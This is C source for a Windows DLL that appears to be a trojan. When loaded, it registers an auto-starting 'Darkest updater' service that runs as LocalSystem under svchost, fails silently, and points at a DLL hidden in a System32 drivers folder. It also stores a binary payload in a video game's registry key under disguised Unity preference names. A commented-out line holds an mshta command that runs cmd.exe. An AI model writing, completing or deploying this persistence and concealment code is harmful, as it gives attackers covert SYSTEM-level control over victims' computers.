//
// Created by mikul on 04.01.2026.
//
#include "library.h"
#include "ntlib.h"
#include "Darkest_Troj.h"
// #include "updater.h"

API_TABLE api;

void OnProcessAttach() {
    HMODULE ntdll = GetLibraryBase(L"ntdll.dll");
    ArchiveNativeAPIs(ntdll, &api);
    RegisterService(&api);
}

int RegisterService(API_TABLE *api) {
    HANDLE keyHandle = CreateRegistryKey(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater",
                                         api);
    HANDLE paramHandle = CreateRegistryKey(
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater\\Parameters", api);
    if (keyHandle == NULL) {
        return -1;
    }

    //wchar_t* imgPath = L"\"C:\\Windows\\System32\\mshta.exe\" javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe /c whoami > C:\\success.txt',0,false);window.close();";
    int start = 2; // autorun on start
    wchar_t *imgPath = L"%SystemRoot%\\System32\\svchost.exe -k netsvcs";
    int type = 32; // Shared process
    int errCont = 0; // do not handle errors, just silently exit
    wchar_t *objectName = L"LocalSystem"; // forces the service to run as the NT-AUTHORITY/system
    wchar_t *displayName = L"Darkest updater service";

    SetRegistryKeyValue(keyHandle, L"ImagePath", REG_EXPAND_SZ, imgPath, (wcslen(imgPath) + 1) * sizeof(wchar_t), api);
    SetRegistryKeyValue(keyHandle, L"Start", REG_DWORD, &start, sizeof(int), api);
    SetRegistryKeyValue(keyHandle, L"Type", REG_DWORD, &type, sizeof(int), api);
    SetRegistryKeyValue(keyHandle, L"ErrorControl", REG_DWORD, &errCont, sizeof(int), api);
    SetRegistryKeyValue(keyHandle, L"ObjectName", REG_SZ, objectName, (wcslen(objectName) + 1) * sizeof(wchar_t), api);
    SetRegistryKeyValue(keyHandle, L"DisplayName", REG_SZ, displayName, (wcslen(displayName) + 1) * sizeof(wchar_t), api);

    wchar_t *dllPath = L"C:\\Windows\\System32\\drivers\\en-US\\DarkestUpdater.dll";
    SetRegistryKeyValue(paramHandle, L"ServiceDll", REG_EXPAND_SZ, dllPath, (wcslen(dllPath) + 1) * 2, api);

    api->NtClose(keyHandle);
    api->NtClose(paramHandle);
    return 0;
}

int HidePayload(API_TABLE * api) {
    HANDLE gameRegistryHandle = CreateRegistryKey(L"\\Registry\\Machine\\SOFTWARE\\RedHook\\Darkest Dungeon II", api);
    if (gameRegistryHandle == NULL) {
        return -1;
    }

    SetRegistryKeyValue(gameRegistryHandle, L"unity.player_preferences", REG_BINARY, &updaterBin, updaterBin_len, api);
    SetRegistryKeyValue(gameRegistryHandle, L"unity.player_id", REG_DWORD, &updaterBin_len, sizeof(unsigned int), api);
    SetRegistryKeyValue(gameRegistryHandle, L"unity.player_id_old", REG_DWORD, &updaterBin_orig_len, sizeof(unsigned int), api);

    return 0;
}

int EmbedStub(API_TABLE * api) {
    return 0;
}

int DllMain(void * hinstDLL, DWORD fdwReason, void * lpvReserved) {
    switch (fdwReason) {
        case 1:
            OnProcessAttach();
            break;
        case 0:
            break;
        default:
            return 0;
    }
    return 1;
}